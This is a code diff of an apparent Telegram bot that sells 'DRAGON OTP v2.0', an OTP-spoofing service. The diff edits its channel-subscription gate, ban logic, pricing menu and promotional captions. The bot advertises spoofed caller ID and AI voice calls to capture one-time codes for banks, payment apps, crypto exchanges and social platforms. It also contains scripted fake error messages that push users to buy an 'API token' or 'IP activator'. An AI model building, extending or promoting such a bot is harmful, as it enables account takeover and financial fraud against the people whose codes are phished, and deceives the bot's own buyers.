@@ -24,11 +24,10 @@ def escape_markdown(text: str) -> str:
     escape_chars = r"_*[]()~`>#+-=|{}.!\\,"
     return re.sub(f"([{re.escape(escape_chars)}])", r"\\\1", text)
 
-async def is_user_subscribed_channel(bot: Bot, user_id, channel , vouches):
+async def is_user_subscribed_channel(bot: Bot, user_id, channel):
     try:
         member: ChatMember = await bot.get_chat_member(chat_id=channel, user_id=user_id)
-        member1: ChatMember = await bot.get_chat_member(chat_id=vouches, user_id=user_id)
-        return member.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.CREATOR, ChatMemberStatus.ADMINISTRATOR] and member1.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.CREATOR, ChatMemberStatus.ADMINISTRATOR]
+        return member.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.CREATOR, ChatMemberStatus.ADMINISTRATOR]
     except:
         return True
 
@@ -42,11 +41,6 @@ async def send_local_video(message: Message):
         try:
             await bot.unban_chat_member(chat_id=-1002420776698, user_id=int(args[1]))
             await bot.send_message(chat_id=7674917466,text="User "+get_user_first_name(int(args[1]))+" has been unbanned from the channel.")
-        except Exception as e:
-            await bot.send_message(chat_id=7674917466,text="Failed to unban user: "+str(e))
-        try:
-            await bot.unban_chat_member(chat_id=-1002674411317, user_id=int(args[1]))
-            await bot.send_message(chat_id=7674917466,text="User "+get_user_first_name(int(args[1]))+" has been unbanned from the vouches.")
         except Exception as e:
             await bot.send_message(chat_id=7674917466,text="Failed to unban user: "+str(e))
     else:
@@ -68,11 +62,6 @@ async def send_local_video(message: Message):
         try:
             await bot.ban_chat_member(chat_id=-1002420776698, user_id=int(args[1]))
             await bot.send_message(chat_id=7674917466,text="User "+get_user_first_name(int(args[1]))+" has been banned from the channel.")
-        except Exception as e:
-            await bot.send_message(chat_id=7674917466,text="Failed to ban user: "+str(e))
-        try:
-            await bot.ban_chat_member(chat_id=-1002674411317, user_id=int(args[1]))
-            await bot.send_message(chat_id=7674917466,text="User "+get_user_first_name(int(args[1]))+" has been banned from the vouches.")
         except Exception as e:
             await bot.send_message(chat_id=7674917466,text="Failed to ban user: "+str(e))
     else:
@@ -113,19 +102,22 @@ async def send_local_video(message: Message):
         ]
         )
         image = FSInputFile("img.jpg")  # Path to your local file
-        await message.answer_photo(image, caption="""*The Ultimate Spoofing Experience*
+        await message.answer_photo(image, caption="""*🐲 Welcome to DRAGON OTP v2\.0 \— The Ultimate Spoofing Experience*
                                 
-    Hello *"""+escape_markdown(name)+"""*\, Welcome to *DRAGON OTP v2\.0* 🐲\.                         
-    *DRAGON OTP* is the \#1 Telegram\-based OTP spoofing system built for professionals\.
+Hello *"""+escape_markdown(name)+"""\,                         
+Step into the future of OTP spoofing with *DRAGON OTP v2\.0* \— the most advanced\, Telegram\-based OTP system engineered for elite professionals\.
 
-    Powered by advanced *AI*\, global *voice routing*\, and *real\-time control*\, it delivers unmatched OTP grabbing performance\.
+🔥 *Why DRAGON OTP?*
+Harness the power of cutting\-edge AI\, ultra\-fast global voice routing\, and seamless real\-time control \— all designed to deliver *unrivaled OTP capture performance*\.
 
-    ✅ *Lightning\-fast execution*
-    ✅ *Stealth\-grade spoofing*
-    ✅ *Full automation tools*
-    ✅ *Global reach with 100% uptime*
+🚀 *Core Features*
+⚡️ Blazing\-Fast Execution
+✅ Military\-Grade Spoofing Stealth
+🤖 Fully Automated Workflow Tools
+📌 Global Coverage with 100% Uptime
 
-    Whether you're *testing*\, *analyzing*\, or *automating* — DRAGON OTP gives you the *precision*\, *power*\, and *stealth* you need to *dominate*\.""", reply_markup=keyboard,parse_mode='MarkdownV2')
+Whether you're *testing systems*\, *analyzing behavior*\, or *building automation workflows*\, *DRAGON OTP* empowers you with the *precision*\, *power*\, and *stealth* needed to lead\.
+  *Dominate your domain \— with DRAGON\. *🐲""", reply_markup=keyboard,parse_mode='MarkdownV2')
     else:
         await message.answer("🚫 You're banned from the bot.")
 
@@ -228,7 +220,7 @@ async def send_local_video(message: Message): #DONE
                     sleep(1)
                     await message.answer("⌛ Please wait.")
                     sleep(9)
-                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram you can't redeem the key, you have to buy an APi token.\n\nContact the support to buy one.",reply_markup=keyboard)
+                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram you can't redeem the key, you have to buy an IP activator.\n\nContact the support to buy one.",reply_markup=keyboard)
             elif args[1] == 'DRAGONOTP-F4awb4Vf1KJp7P4LhC60':
                 if is_user_useAPI(user_id):
                     sleep(1)
@@ -301,11 +293,6 @@ async def send_local_video(message: Message): #DONE
                     await bot.send_message(chat_id=7674917466,text="User "+get_user_first_name(user_id)+" has been banned from the channel.")
                 except Exception as e:
                     await bot.send_message(chat_id=7674917466,text="Failed to ban user: "+str(e))
-                try:
-                    await bot.ban_chat_member(chat_id=-1002674411317, user_id=user_id)
-                    await bot.send_message(chat_id=7674917466,text="User "+get_user_first_name(user_id)+" has been banned from the vouches.")
-                except Exception as e:
-                     await bot.send_message(chat_id=7674917466,text="Failed to ban user: "+str(e))
             else:
                 sleep(1)
                 await message.answer("⌛ Please wait.")
@@ -319,8 +306,7 @@ async def send_local_video(message: Message):
     user_id = message.from_user.id
     if is_user_banned(user_id)==False:
         channel_username = "@dragonotpchannel"
-        vouches = "@DRAGONv2_vouches"
-        if await is_user_subscribed_channel(bot, user_id, channel_username,vouches):
+        if await is_user_subscribed_channel(bot, user_id, channel_username):
             if is_user_subscribe(user_id):
                 keyboard = InlineKeyboardMarkup(
             inline_keyboard=[
@@ -369,18 +355,17 @@ async def send_local_video(message: Message):
         inline_keyboard=[
             [
                 InlineKeyboardButton(text="🌐 Community", url="https://t.me/dragonotpchannel"),
-                InlineKeyboardButton(text="✅ Vouches", url="https://t.me/DRAGONv2_vouches")
             ],
             [
                 InlineKeyboardButton(text="📍 I've Subscribed", callback_data="start")
             ]
         ]
         )
-            await message.answer("""⚠️ *You are not subscribed to our channels*
+            await message.answer("""⚠️ *You are not subscribed to our channel*
 
-    To use the bot, please subscribe to the required channels and group\.
+    To use the bot, please subscribe to the required channel\.
 
-    👇 Click the buttons below to reach our channels\:""",parse_mode='MarkdownV2', reply_markup=keyboard)
+    👇 Click the buttons below to reach our channel\:""",parse_mode='MarkdownV2', reply_markup=keyboard)
     else:
         await message.answer("🚫 You're banned from the bot.")
 
@@ -389,8 +374,7 @@ async def send_local_video(callback: CallbackQuery):
     user_id = callback.from_user.id
     if is_user_banned(user_id)==False:
         channel_username = "@dragonotpchannel"
-        vouches = "DRAGONv2_vouches"
-        if await is_user_subscribed_channel(bot, user_id, channel_username,vouches):
+        if await is_user_subscribed_channel(bot, user_id, channel_username):
             await callback.message.delete()
             keyboard = InlineKeyboardMarkup(
             inline_keyboard=[
@@ -414,19 +398,22 @@ async def send_local_video(callback: CallbackQuery):
             ]
             )
             video = FSInputFile("img.jpg")  # Path to your local file
-            await callback.message.answer_photo(video, caption="""*The Ultimate Spoofing Experience*
+            await callback.message.answer_photo(video, caption="""*🐲 Welcome to DRAGON OTP v2\.0 \— The Ultimate Spoofing Experience*
                                 
-    Hello *"""+escape_markdown(get_user_first_name(user_id))+"""*\, Welcome to *DRAGON OTP v2\.0* 🐲\.                         
-    *DRAGON OTP* is the \#1 Telegram\-based OTP spoofing system built for professionals\.
+Hello *"""+escape_markdown(get_user_first_name(user_id))+"""\,                         
+Step into the future of OTP spoofing with *DRAGON OTP v2\.0* \— the most advanced\, Telegram\-based OTP system engineered for elite professionals\.
 
-    Powered by advanced *AI*\, global *voice routing*\, and *real\-time control*\, it delivers unmatched OTP grabbing performance\.
+🔥 *Why DRAGON OTP?*
+Harness the power of cutting\-edge AI\, ultra\-fast global voice routing\, and seamless real\-time control \— all designed to deliver *unrivaled OTP capture performance*\.
 
-    ✅ *Lightning\-fast execution*
-    ✅ *Stealth\-grade spoofing*
-    ✅ *Full automation tools*
-    ✅ *Global reach with 100% uptime*
+🚀 *Core Features*
+⚡️ Blazing\-Fast Execution
+✅ Military\-Grade Spoofing Stealth
+🤖 Fully Automated Workflow Tools
+📌 Global Coverage with 100% Uptime
 
-    Whether you're *testing*\, *analyzing*\, or *automating* — DRAGON OTP gives you the *precision*\, *power*\, and *stealth* you need to *dominate*\.""", reply_markup=keyboard,parse_mode='MarkdownV2')
+Whether you're *testing systems*\, *analyzing behavior*\, or *building automation workflows*\, *DRAGON OTP* empowers you with the *precision*\, *power*\, and *stealth* needed to lead\.
+  *Dominate your domain \— with DRAGON\. *🐲""", reply_markup=keyboard,parse_mode='MarkdownV2')
     else:
         await callback.message.answer("🚫 You're banned from the bot.")
 
@@ -436,8 +423,7 @@ async def handle_vote(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
     if is_user_banned(user_id)==False:
         channel_username = "@dragonotpchannel"
-        vouches = "@DRAGONv2_vouches"
-        if await is_user_subscribed_channel(bot, user_id, channel_username,vouches):
+        if await is_user_subscribed_channel(bot, user_id, channel_username):
             keyboard = InlineKeyboardMarkup(
         inline_keyboard=[
             [
@@ -446,40 +432,39 @@ async def handle_vote(callback: CallbackQuery, bot: Bot):
         ]
         )
             await callback.message.delete()
-            await callback.message.answer("""🐲 DRAGON OTP v2.0  - 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 ( INTERNATIONAL CALLS )
+            await callback.message.answer("""🐲 *DRAGON OTP v2\.0* \- Commands
     ❓ 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 
-        🔑 》/redeem | 𝙍𝙚𝙙𝙚𝙚𝙢 𝙖 𝙠𝙚𝙮
-        📲 》/call | 𝘾𝙖𝙥𝙩𝙪𝙧𝙚 𝘼𝙣𝙮 𝙘𝙤𝙙𝙚 
-        📱 》/Phonelist | Check List of Latest Spoof Numbers  
+        🔑 》/redeem \| Redeem a key
+        📲 》/call \| Make a call
+        📱 》/Phonelist \| Check List of Latest Spoof Numbers  
                                                     
     📞 Available Services For /call command                 
-        》 Marcus | capture Marcus otp
-        》 zelle | capture zelle otp
-        》 Email | capture email otp
-        》 CIBC | capture CIBC otp
-        》 CashApp | capture cashapp otp
-        》 ApplePay | capture applepay otp
-        》 PayPal | capture paypal otp                                                            
-        》 BankofAmerica | capture bank of america otp 
-        》 Amazon | capture amazon otp
-        》 Gmail | capture gmail otp
-        》 wellsfargo | capture wellsfargo otp
-        》 Venmo | capture venmo otp                                  
-        》 citizens | capture citizens otp
-        》 CapitalOne | capture capitalone otp
-        》 Coinbase | capture coinbase otp
-        》 Afterpay | capture afterpay otp
-        》 Visa | capture visa otp
-        》 MasterCard | capture mastercard otp
-        》 Facebook | capture facebook otp
-        》 WhatsApp | capture whatsapp otp
-        》 Instagram | capture instagram otp""",reply_markup=keyboard)
+        》 *Marcus* \| capture Marcus otp
+        》 *zelle* \| capture zelle otp
+        》 *Email* \| capture email otp
+        》 *CIBC* \| capture CIBC otp
+        》 *CashApp* \| capture cashapp otp
+        》 *ApplePay* \| capture applepay otp
+        》 *PayPal* \| capture paypal otp                                                            
+        》 *BankofAmerica* \| capture bank of america otp 
+        》 *Amazon* \| capture amazon otp
+        》 *Gmail* \| capture gmail otp
+        》 *wellsfargo* \| capture wellsfargo otp
+        》 *Venmo* \| capture venmo otp                                  
+        》 *citizens* \| capture citizens otp
+        》 *CapitalOne* \| capture capitalone otp
+        》 *Coinbase* \| capture coinbase otp
+        》 *Afterpay* \| capture afterpay otp
+        》 *Visa* \| capture visa otp
+        》 *MasterCard* \| capture mastercard otp
+        》 *Facebook* \| capture facebook otp
+        》 *WhatsApp* \| capture whatsapp otp
+        》 *Instagram* \| capture instagram otp""",reply_markup=keyboard,parse_mode='MarkdownV2')
         else:
             keyboard = InlineKeyboardMarkup(
         inline_keyboard=[
             [
                 InlineKeyboardButton(text="🌐 Community", url="https://t.me/dragonotpchannel"),
-                InlineKeyboardButton(text="✅ Vouches", url="https://t.me/DRAGONv2_vouches")
             ],
             [
                 InlineKeyboardButton(text="📍 I've Subscribed", callback_data="start")
@@ -487,11 +472,11 @@ async def handle_vote(callback: CallbackQuery, bot: Bot):
         ]
         )
             await callback.message.delete()
-            await callback.message.answer("""⚠️ *You are not subscribed to our channels*
+            await callback.message.answer("""⚠️ *You are not subscribed to our channel*
 
-    To use the bot, please subscribe to the required channels and group\.
+    To use the bot, please subscribe to the required channel\.
 
-    👇 Click the buttons below to reach our channels\:""",parse_mode='MarkdownV2', reply_markup=keyboard)
+    👇 Click the buttons below to reach our channel\:""",parse_mode='MarkdownV2', reply_markup=keyboard)
         await callback.answer() 
     else:
         await callback.message.answer("🚫 You're banned from the bot.")
@@ -502,7 +487,6 @@ async def send_local_video(message: Message):
     user_id = message.from_user.id
     if is_user_banned(user_id)==False:
         channel = "@dragonotpchannel"
-        vouches = "@DRAGONv2_vouches"
         if is_user_subscribe(user_id):
             args = message.text.split(maxsplit=3)
             if len(args)!=4:
@@ -529,7 +513,7 @@ async def send_local_video(message: Message):
                     await message.answer("You have to type a valid phone number start with +")
                 elif not(args[3].isdecimal()):
                     await message.answer("The digits must be between 4 and 8")
-        elif await is_user_subscribed_channel(bot, user_id, channel, vouches):
+        elif await is_user_subscribed_channel(bot, user_id, channel):
             keyboard = InlineKeyboardMarkup(
         inline_keyboard=[
             [
@@ -546,18 +530,17 @@ async def send_local_video(message: Message):
         inline_keyboard=[
             [
                 InlineKeyboardButton(text="🌐 Community", url="https://t.me/dragonotpchannel"),
-                InlineKeyboardButton(text="✅ Vouches", url="https://t.me/DRAGONv2_vouches")
             ],
             [
                 InlineKeyboardButton(text="📍 I've Subscribed", callback_data="start")
             ]
         ]
         )
-            await message.answer("""⚠️ *You are not subscribed to our channels*
+            await message.answer("""⚠️ *You are not subscribed to our channel*
 
-    To use the bot, please subscribe to the required channels and group\.
+    To use the bot, please subscribe to the required channel\.
 
-    👇 Click the buttons below to reach our channels\:""",parse_mode='MarkdownV2', reply_markup=keyboard)
+    👇 Click the buttons below to reach our channel\:""",parse_mode='MarkdownV2', reply_markup=keyboard)
     else:
         await message.answer("🚫 You're banned from the bot.")
 
@@ -567,8 +550,7 @@ async def handle_vote1(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
     if is_user_banned(user_id)==False:
         channel_username = "@dragonotpchannel"
-        vouches = "@DRAGONv2_vouches"
-        if await is_user_subscribed_channel(bot, user_id, channel_username,vouches):
+        if await is_user_subscribed_channel(bot, user_id, channel_username):
             keyboard = InlineKeyboardMarkup(
         inline_keyboard=[
             [
@@ -585,25 +567,43 @@ async def handle_vote1(callback: CallbackQuery, bot: Bot):
         ]
         )
             await callback.message.delete()
-            await callback.message.answer("""🐲 *DRAGON OTP v2\.0* Prices list 💰
-    ━━━━━━━━━━━━━━━━
-    • 1 Day Plan *\(25$\)*
-    • 2 Days Plan *\(30$\)*
-    • 1 Week Plan *\(40$\)*
-    • 2 Weeks Plan *\(55$\)* 
-    • 1 Month Plan *\(70$\)*
-    • 2 Months Plan *\(100$\)*
-    • LifeTime Plan *\(350$\)*                               
-    ━━━━━━━━━━━━━━━━
-    
-    📩 After payment\, send a screenshot to *SUPPORT* to verify your subscription\.
-    ❓ Need help or a different wallet\? Contact *SUPPORT*\.""",parse_mode='MarkdownV2',reply_markup=keyboard)
+            await callback.message.answer("""💰 DRAGON OTP v2\.0 \— Pricing Plans
+Choose the plan that fits your workflow\.
+
+━━━━━━━━━━━━━━━━━━━
+📅 Subscription Options
+
+• 🕐 1 Day Access \— *$25*
+
+• 🕑 2 Days Access \— *$30*
+
+• 🗓️ 1 Week Plan \— *$40*
+
+• 🗓️ 2 Weeks Plan \— *$55*
+
+• 📆 1 Month Plan \— *$70*
+
+• 📆 2 Months Plan \— *$100*
+
+• ♾️ Lifetime Access \— *$350*
+
+━━━━━━━━━━━━━━━━━━━
+
+📩 How to Activate
+After completing your payment\:
+
+Take a screenshot of your payment confirmation\.
+
+Send it to *SUPPORT* to verify and activate your subscription\.
+
+❓ Need Help?
+Have questions or need a different wallet option?
+📬 Contact *SUPPORT* \— we’re here to assist\.""",parse_mode='MarkdownV2',reply_markup=keyboard)
         else:
             keyboard = InlineKeyboardMarkup(
         inline_keyboard=[
             [
-                InlineKeyboardButton(text="🌐 Community", url="https://t.me/dragonotpchannel"),
-                InlineKeyboardButton(text="✅ Vouches", url="https://t.me/DRAGONv2_vouches")
+                InlineKeyboardButton(text="🌐 Community", url="https://t.me/dragonotpchannel")
             ],
             [
                 InlineKeyboardButton(text="📍 I've Subscribed", callback_data="start")
@@ -611,11 +611,11 @@ async def handle_vote1(callback: CallbackQuery, bot: Bot):
         ]
         )
             await callback.message.delete()
-            await callback.message.answer("""⚠️ *You are not subscribed to our channels*
+            await callback.message.answer("""⚠️ *You are not subscribed to our channel*
 
-    To use the bot, please subscribe to the required channels and group\.
+    To use the bot, please subscribe to the required channel\.
 
-    👇 Click the buttons below to reach our channels\:""",parse_mode='MarkdownV2', reply_markup=keyboard)
+    👇 Click the buttons below to reach our channel\:""",parse_mode='MarkdownV2', reply_markup=keyboard)
         await callback.answer() 
     else:
         await callback.message.answer("🚫 You're banned from the bot.")
@@ -626,8 +626,7 @@ async def handle_vote1(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
     if is_user_banned(user_id)==False:
         channel_username = "@dragonotpchannel"
-        vouches = "@DRAGONv2_vouches"
-        if await is_user_subscribed_channel(bot, user_id, channel_username,vouches):
+        if await is_user_subscribed_channel(bot, user_id, channel_username):
             keyboard = InlineKeyboardMarkup(
         inline_keyboard=[
             [
@@ -637,23 +636,40 @@ async def handle_vote1(callback: CallbackQuery, bot: Bot):
         )
             await callback.message.delete()
             image = FSInputFile("img.jpg")  # Path to your local file
-            await callback.message.answer_photo(image, caption="""🐉 *UNIQUE FEATURES*
+            await callback.message.answer_photo(image, caption="""🐲 *DRAGON OTP v2\.0 \— Unique Features That Set You Apart*
 
-    🚀 Lightning Fast OTP Delivery  
-    🎭 Custom Caller ID \(Spoofing Mode\)  
-    🔊 AI Voice Calls with Human Detection  
-    📞 Call Any Number Worldwide  
-    📦 Multiple OTP Services Supported  
-    📁 Live Call Recording \& Logs  
-    📊 Real\-Time Dashboard \& Analytics  
-    🔐 Encrypted Access \& Security  
-    📲 Use Anywhere Anytime""",parse_mode='MarkdownV2',reply_markup=keyboard)
+✨ *Feature Highlights*
+    🚀 *Lightning\-Fast OTP Execution*
+    Blazing speed for real\-time code delivery\—no delays\, no compromise\.
+
+    🎭 *Custom Caller ID \(Spoofing Mode\)*
+    Impersonate trusted sources with customizable IDs \(within legal bounds\)\.
+
+    🔊 *AI Voice Calls with Human Detection*
+    Smart voice automation with built\-in detection for human interactions\.
+
+    📞 *Global Call Capability*
+    Initiate calls to any number\, in any region\—no borders\, no limits\.
+
+    📦 *Multi\-Service OTP Support*
+    Works seamlessly with a wide range of services for unmatched versatility\.
+
+    📁 *Live Call Recording \& Full Logs*
+    Track every second\—record\, review\, and analyze each interaction\.
+
+    📊 *Real\-Time Dashboard \& Insights*
+    Stay in control with live performance stats and detailed analytics\.
+
+    🔐 *Encrypted \& Secure Access*
+    Top\-tier protection to keep your operations locked and private\.
+
+    📲 *Use Anytime\, Anywhere*
+    Cross\-platform and cloud-based—optimized for 24/7 availability\.""",parse_mode='MarkdownV2',reply_markup=keyboard)
         else:
             keyboard = InlineKeyboardMarkup(
         inline_keyboard=[
             [
                 InlineKeyboardButton(text="🌐 Community", url="https://t.me/dragonotpchannel"),
-                InlineKeyboardButton(text="✅ Vouches", url="https://t.me/DRAGONv2_vouches")
             ],
             [
                 InlineKeyboardButton(text="📍 I've Subscribed", callback_data="start")
@@ -661,11 +677,11 @@ async def handle_vote1(callback: CallbackQuery, bot: Bot):
         ]
         )
             await callback.message.delete()
-            await callback.message.answer("""⚠️ *You are not subscribed to our channels*
+            await callback.message.answer("""⚠️ *You are not subscribed to our channel*
 
-    To use the bot, please subscribe to the required channels and group\.
+    To use the bot, please subscribe to the required channel\.
 
-    👇 Click the buttons below to reach our channels\:""",parse_mode='MarkdownV2', reply_markup=keyboard)
+    👇 Click the buttons below to reach our channel\:""",parse_mode='MarkdownV2', reply_markup=keyboard)
         await callback.answer() 
     else:
         await callback.message.answer("🚫 You're banned from the bot.")
@@ -676,8 +692,7 @@ async def handle_vote1(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
     if is_user_banned(user_id)==False:
         channel_username = "@dragonotpchannel"
-        vouches = "@DRAGONv2_vouches"
-        if await is_user_subscribed_channel(bot, user_id, channel_username,vouches):
+        if await is_user_subscribed_channel(bot, user_id, channel_username):
             if is_user_subscribe(user_id):
                 keyboard = InlineKeyboardMarkup(
             inline_keyboard=[
@@ -720,8 +735,7 @@ async def handle_vote1(callback: CallbackQuery, bot: Bot):
             keyboard = InlineKeyboardMarkup(
         inline_keyboard=[
             [
-                InlineKeyboardButton(text="🌐 Community", url="https://t.me/dragonotpchannel"),
-                InlineKeyboardButton(text="✅ Vouches", url="https://t.me/DRAGONv2_vouches")
+                InlineKeyboardButton(text="🌐 Community", url="https://t.me/dragonotpchannel")
             ],
             [
                 InlineKeyboardButton(text="📍 I've Subscribed", callback_data="start")
@@ -729,11 +743,11 @@ async def handle_vote1(callback: CallbackQuery, bot: Bot):
         ]
         )
             await callback.message.delete()
-            await callback.message.answer("""⚠️ *You are not subscribed to our channels*
+            await callback.message.answer("""⚠️ *You are not subscribed to our channel*
 
-    To use the bot, please subscribe to the required channels and group\.
+    To use the bot, please subscribe to the required channel\.
 
-    👇 Click the buttons below to reach our channels\:""",parse_mode='MarkdownV2', reply_markup=keyboard)
+    👇 Click the buttons below to reach our channel\:""",parse_mode='MarkdownV2', reply_markup=keyboard)
         await callback.answer()
     else:
         await callback.message.answer("🚫 You're banned from the bot.")
